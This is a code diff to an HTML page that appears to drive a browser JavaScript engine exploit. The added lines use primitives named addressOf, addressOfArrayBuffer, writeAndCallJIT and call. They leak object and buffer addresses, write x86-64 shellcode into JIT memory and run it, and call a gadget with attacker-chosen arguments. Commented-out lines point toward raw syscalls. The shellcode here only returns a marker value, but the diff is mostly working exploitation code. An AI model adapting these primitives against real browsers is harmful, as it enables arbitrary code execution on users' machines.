@@ -16,11 +16,18 @@
             }
 
             with (exploit) {
-                alert("foo : " + addressOf( {a:1} ).toString(16));
-                alert("bar : " + addressOfArrayBuffer(new Uint32Array(0x10)).toString(16));
+                log("Get the address of a JSObject : 0x" + addressOf( {a:1} ).toString(16));
+                log("Get the underlying vector address of an ArrayBuffer : 0x" + addressOfArrayBuffer(new Uint32Array(0x10)).toString(16));
 
-                var shellcode = [ 0xCC, 0xCC, 0xCC, 0xCC ];
-                writeAndCallJIT(shellcode);
+                var shellcode = [ 0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0xFF, 0xFF, 0xC3 ];   // mov rax, 0xffff000041414141; ret;
+                var retval = writeAndCallJIT(shellcode);
+                log("Shellcode execution success!");
+                log("Return value : 0x" + retval.toString(16));
+                log("Calling an arbitrary function with user controlled arguments...");
+                call(gadgets.return, 1, 2, 3, 4, 5, 6);
+                log("Success!");
+                // call(new Integer(0x41414141, 0x43434343), 1, 2, 3, 4, 5, 6);
+                // syscall(0x1234, 1, 2, 3, 4, 5, 6);
             }
         </script>
     </body>
